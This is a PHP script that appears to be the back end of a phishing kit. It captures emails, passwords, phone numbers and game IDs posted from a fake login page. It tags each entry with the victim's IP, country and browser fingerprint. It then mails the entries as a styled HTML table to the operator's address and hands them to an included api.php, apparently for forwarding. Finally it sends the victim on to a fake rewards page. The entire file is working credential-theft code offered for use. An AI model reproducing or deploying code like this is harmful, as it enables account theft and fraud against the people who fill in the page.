<?php
require 'detect.php';
include 'email.php';
$IP = getenv("REMOTE_ADDR");
$date = date("d M, Y");
$times = date("g:i a");
$code = $_SESSION['ip_countryCode']=clientData('code');
$country = strtolower($code);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$email = $_POST['email'];
$password = $_POST['password'];
$playid = $_POST['playid'];
$phone = $_POST['phone'];
$login = $_POST['login'];

//auth license //

if($email == "" && $password == "" && $phone == "" && $playid == "" && $login == ""){
header("Location: index.php");
}else{

//Sitemap include //


$msg = ("

[Login] =   ".$login."
[Email]  =  ".$email."
[Pass]  =   ".$password."


[+]============System============[+]
[IP INFO] = http://www.geoiptool.com/?IP=".$IP."

[TIME/DATE] =".$times." / ".$date."

[Country] = ".$country."

[FINGERPRINT] = ".$useragent."
");


$pesan = '
<center>
 <div style="background: url(https://j.top4top.io/p_2224gza4x0.png) no-repeat;border:2px solid pink;background-size: 100% 100%; width: 294; height: 101px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
</div>
 <table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid pink; border-collapse:collapse;width:100%;background:#cf0485;">
    <tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Email/Telpon</b></th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$email.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Password</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$password.'</th> 
</tr>
</table>
<div style="border:2px solid pink;width: 294; font-weight:bold; height: 20px; background: #cf0485; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">

<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#3b5998;" href="https://wa.me/6282183925354">𝙵𝚊𝚌𝚎𝚋𝚘𝚘𝚔</a>
<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#0088CC;" href="#">𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖</a>
<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#25D366;" href="#">𝚆𝚑𝚊𝚝𝚜𝚊𝚙𝚙</a>
</div>
 <center>
';
$headers = "MIME-Version: 1.0\r\n";
$headers = "MIME-Version: 1.0\r\nContent-type: text/html; charset=iso-8859-1\r\n";
$headers .= '' . $sender . "" . "\r\n";
mail($emailku, $subjek, $pesan, $headers);

$url = $msg;include("api.php");

if($url) {
echo "<form id='imnoob59' method='POST' action='../../rewards.php'>
<input type='hidden' name='email' value='$email'>
</form>
<script type='text/javascript'>document.getElementById('imnoob59').submit();</script>";
}
}
?>